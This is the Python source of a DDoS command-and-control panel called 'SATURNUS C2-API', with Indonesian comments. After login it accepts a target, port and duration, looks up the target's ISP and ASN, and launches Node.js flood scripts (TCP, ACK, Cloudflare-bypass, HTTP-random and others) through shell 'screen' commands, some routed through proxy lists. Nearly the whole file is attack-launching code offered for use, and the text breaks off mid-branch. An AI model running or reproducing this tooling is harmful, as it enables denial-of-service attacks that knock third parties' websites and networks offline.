# -*- coding: utf-8 -*-
from operator import index
import socket
import random
import string
import threading
import getpass
import urllib
from colorama import Fore, Back
import os,sys,time as t,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
import codecs

# Global variable for username
logged_in_user = None  # We'll store the username here after login
ongoing_attacks = []  # List to store ongoing attack details

def read_login_data(filename):
    try:
        with open(filename, "r") as file:
            login_data = {}
            for line in file:
                username, password = line.strip().split(":")
                login_data[username] = password
            return login_data
    except FileNotFoundError:
        print(f"File {filename} tidak ditemukan.")
        return None
    except ValueError:
        print("Format data login tidak valid.")
        return None

def login(login_data):
    global logged_in_user  # Declare global variable to store logged-in username
    while True:
        os.system('clear')
        print("""
[ \033[36mSYSTEM\033[0m ] Welcome To SATURNUS🔥C2-API \033[36m@PUTRAx666\033[0m Enjoy Your Stay Here!
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀\033[36m⡀\033[0m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀\033[36m⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀\033[0m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀\033[36m⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀\033[0m⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀\033[36m⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀\033[0m⠀⠀
⠀⠀⠀⠀⠀⠀\033[36m⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧\033[0m⠀
⠀⠀⠀\033[36m⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋\033[0m⠀
\033[1m⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋\033[0m⠀⠀⠀
\033[1m⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁\033[0m⠀⠀⠀⠀
\033[1m⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏\033[0m⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀\033[1m⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆\033[0m⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀    ⠀⠀\033[1m⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉\033[0m⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        🔥 \033[31mWELLCOME TO SATURNUS C2-API\033[0m 🔥
        
\033[35mTELEGRAM\033[0m : \033[36mT.ME/PUTRAx666\033[0m
\033[35mEXPIRY\033[0m : \033[36m4.85 Day(s) day(s) left\033[0m
\033[35mLOG\033[0m : \033[36mSSH-2.0-libssh2_1.11.0\033[0m

Please Type "\033[36mHELP\033[0m" For More Information
------------------------------------------------------------------
""")
        username = input("Username » ")
        password = input("Password » ")
        if username in login_data and login_data[username] == password:
            logged_in_user = username  # Store the username of the logged-in user
            print(f"""
Login berhasil! Welcome, {username} 🪐!""")
            t.sleep(1)
            menu()
            main()
            return
        else:
            print("Username atau password salah. Silakan coba lagi.")
            t.sleep(1)

ip = requests.get('https://api.ipify.org').text.strip()

def methods():
    # Baca data dari file JSON
    with open('assets/methods.json', 'r') as file:
        methods_data = json.load(file)

    print(f"""                          Methods
 {'NAME'}     │ {'DESCRIPTION'}                   │ {'DURATION'} """)
    print('──────────┼───────────────────────────────┼──────────')
    for method in methods_data:
        print(f"{method['name']:<9} │ {method['description']:<29} │ {method['duration']:<3}")

# Fungsi untuk mendapatkan ISP, ASN, org, dan country berdasarkan IP menggunakan API ip-api.com
def get_ip_info(ip):
    try:
        # URL untuk mendapatkan data dari API ip-api.com
        url = f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query"
        
        # Mengirim permintaan ke API ip-api.com untuk mendapatkan data IP
        response = requests.get(url)
        data = response.json()

        # Cek apakah status API berhasil atau gagal
        if data['status'] != 'success':
            return 'Unknown ASN', 'Unknown ISP', 'Unknown Org', 'Unknown Country'  # Jika gagal, kembalikan 'Unknown'

        # Mengambil informasi ISP, ASN, org, dan country
        asn = data.get('as', 'Unknown ASN')  # ASN biasanya disediakan dalam format 'ASXXXX'
        isp = data.get('isp', 'Unknown ISP')
        org = data.get('org', 'Unknown Org')  # Organisasi yang memiliki IP ini
        country = data.get('country', 'Unknown Country')  # Negara yang terkait dengan IP

        return asn, isp, org, country
    except requests.RequestException as e:
        print(f"Error fetching ASN and ISP data: {e}")
        return 'ASN Unknown', 'ISP Unknown', 'Org Unknown', 'Country Unknown'  # Jika ada kesalahan dalam permintaan

# Fungsi untuk mengekstrak IP dari URL
def get_ip_from_url(url):
    try:
        # Menggunakan socket untuk mendapatkan IP dari URL (hostname)
        hostname = url.split("://")[-1].split("/")[0]  # Menangani http/https dan menghilangkan path
        ip = socket.gethostbyname(hostname)  # Mendapatkan IP dari hostname
        return ip
    except socket.gaierror:
        print(f"Error: Unable to resolve IP for URL {url}")
        return None

# Fungsi untuk mendapatkan waktu saat ini dalam format yang diinginkan
def waktu():
    # Mendapatkan waktu saat ini dalam format yang diinginkan
    return datetime.now().strftime("%b/%d/%Y")

B = '\033[35m' #MERAH
P = '\033[1;37m' #PUTIH

# Fungsi untuk memperbarui status serangan secara otomatis
def update_attacks():
    global ongoing_attacks  # Menggunakan global variable ongoing_attacks

    while True:
        completed_attacks = []
        for attack in ongoing_attacks:
            elapsed_time = int(t.time() - attack['start_time'])

            # Jika serangan telah selesai (elapsed_time >= duration)
            if elapsed_time >= attack['duration']:
                attack['status'] = 'Completed'
                completed_attacks.append(attack)

        # Hapus serangan yang sudah selesai dari daftar ongoing_attacks
        ongoing_attacks = [attack for attack in ongoing_attacks if attack not in completed_attacks]

        # Tunggu beberapa detik sebelum mengecek kembali
        t.sleep(1)  # Bisa disesuaikan sesuai kebutuhan

# Fungsi untuk menampilkan serangan yang sedang berlangsung
def ongoing():
    global ongoing_attacks  # Menggunakan global variable ongoing_attacks

    if ongoing_attacks:
        print(f"""                      Running
 {'#'} │       {'HOST'}      │ {'SINCE'} │ {'DURATION'} │ {'METHOD'} """)
        print('───┼─────────────────┼───────┼──────────┼────────')

        # Memperbarui status serangan yang sudah selesai dan menghapusnya
        completed_attacks = []
        for attack in ongoing_attacks:
            elapsed_time = int(t.time() - attack['start_time'])

            # Jika serangan telah selesai (elapsed_time >= duration)
            if elapsed_time >= attack['duration']:
                attack['status'] = 'Completed'
                completed_attacks.append(attack)  # Menambahkan serangan yang selesai ke list 'completed_attacks'
            else:
                attack['status'] = 'Ongoing'

        # Hapus serangan yang sudah selesai dari daftar ongoing_attacks
        ongoing_attacks = [attack for attack in ongoing_attacks if attack not in completed_attacks]

        # Menampilkan serangan yang sedang berlangsung
        for i, attack in enumerate(ongoing_attacks, 1):
            elapsed_time = int(t.time() - attack['start_time'])
            print(f" {i} │ {attack['host']:>15} │  {elapsed_time:>3}  │    {attack['duration']:>3}   │ {attack['method']:<9} ")

        # Menampilkan serangan yang sudah selesai, jika ada
        for i, attack in enumerate(completed_attacks, 1):
            print(f" {i} │ {attack['host']:>15} │  {attack['duration']:>3}  │    {attack['duration']:>3}   │ {attack['method']:<9} ")

    else:
        print("(cnc) No running attacks, why not start some?")

def myinfo():
    print(f"""username={logged_in_user}
concurrents=3
timelimit=86000
cooldown=0
expiry=9999.99 Millenium(s) left
Myip={ip}:48970
Myclient=SSH-2.0-OpenSSH_9.9""")

def credits():
    print("""============CREDITS============
Version: 9.1
Creator: Rex
Website: Coming Soon
==============END==============""")

def help():
    print("""                              Commands
 NAME     │ ALIAS              │ DESCRIPTION
──────────┼────────────────────┼────────────────────────────────────
 help     │ ----               │ display all registered commands
 methods  │ ----               │ display all registered methods
 clear    │ cls,c              │ see your amazing banner
 ongoing  │ ----               │ view running attacks
 exit     │ goodbye,imaheadout │ removes your session
 credits  │ whodoneit          │ credits
 myinfo   │ acccount,info      │ returns user info""")

def menu():
    os.system('clear')
    print(f"""
[ \033[36mSYSTEM\033[0m ] Welcome To SATURNUS🔥C2-API \033[36m@PUTRAx666\033[0m Enjoy Your Stay Here!
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀\033[36m⡀\033[0m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀\033[36m⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀\033[0m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀\033[36m⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀\033[0m⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀\033[36m⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀\033[0m⠀⠀
⠀⠀⠀⠀⠀⠀\033[36m⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧\033[0m⠀
⠀⠀⠀\033[36m⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋\033[0m⠀
\033[1m⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋\033[0m⠀⠀⠀
\033[1m⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁\033[0m⠀⠀⠀⠀
\033[1m⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏\033[0m⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀\033[1m⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆\033[0m⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀    ⠀⠀\033[1m⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉\033[0m⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        🔥 \033[31mWELLCOME TO SATURNUS C2-API\033[0m 🔥
        
\033[35mTELEGRAM\033[0m : \033[36mT.ME/PUTRAx666\033[0m
\033[35mEXPIRY\033[0m : \033[36m4.85 Day(s) day(s) left\033[0m
\033[35mLOG\033[0m : \033[36mSSH-2.0-libssh2_1.11.0\033[0m

Please Type "\033[36mHELP\033[0m" For More Information
------------------------------------------------------------------
""")

def main():
    global ongoing_attacks
    threading.Thread(target=update_attacks, daemon=True).start()
    while True:
        sys.stdout.write(f"\x1b]2;0 boats | Succubus Custom Build | Serving {logged_in_user} | Active Sessions 2 | 9999.99 Millenium(s)\x07")
        sin = input(f"\033[48;5;15m\033[1;31m{logged_in_user}\033[0m • \033[48;5;15m\033[1;31mRex\x1b[1;40m\033[0m ➤ \x1b[1;37m\033[0m")
        sinput = sin.split(" ")[0]
        if sinput == "cls" or sinput == "c":
            os.system('clear')
            menu()
        if sinput == "stop":
            ongoing_attacks = []  # Reset ongoing attacks when stop is typed
            menu()            
        if sinput == "help":
            help()
        if sinput == "myinfo" or sinput == "account" or sinput == "info":
            myinfo()
        if sinput == "methods":
            methods()
        if sinput == "ongoing":
            ongoing()
        if sinput == "credits" or sinput == "whodoneit":
            credits()
        if sinput == "exit" or sinput == "goodbye" or sinput == "imaheadout":
            print("Goodbye !")
            break
        elif sinput == "":
            main()

#########LAYER-4 - 7########
        elif sinput == "tcp" or sinput == "TCP":
            try:
                ip = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])
                
                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'tcp',
                        'status': 'Ongoing'
                    })
                    os.system('clear')
                    
                    print(f"""
\033[1;36m      POWERED BY : [ • Rex • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/Rex\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m @RexSecPln\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'screen -dm node tcp.js {ip} {port} {duration}')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "ack" or sinput == "ACK":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'ack',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ • Rex • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/Rex\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m @RexSecPln\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'screen -dm node ACK.js {url} {duration} 64 15 proxy.txt')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "cf" or sinput == "CF":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'cf',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ • Rex • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/Rex\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m @RexSecPln\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'screen -dm node cf.js {url} {duration} 15')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "http-rand" or sinput == "HTTP-RAND":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'http-rand',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ • Rex • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/Rex\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m @RexSecPln\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'screen -dm node HTTP-RAND.js {url} {duration}')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "cfbypass" or sinput == "CFBYPASS":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'cfbypass',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ • Rex • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/Rex\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m @RexSecPln\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'screen -dm node CFBypass.js {url} {duration}')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "rapid" or sinput == "RAPID":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'rapid',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ • Rex • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/Rex\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m @RexSecPln\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'screen -dm node RAPID.js {url} {duration} 64 15 proxy.txt')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "xyn" or sinput == "XYN":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'xyn',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ • Rex • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/Rex\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m @RexSecPln\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'screen -dm node xyn.js {url} {duration} 64 15 proxy.txt')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "chaptcha" or sinput == "CHAPTCHA":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'chaptcha',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ • Rex • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
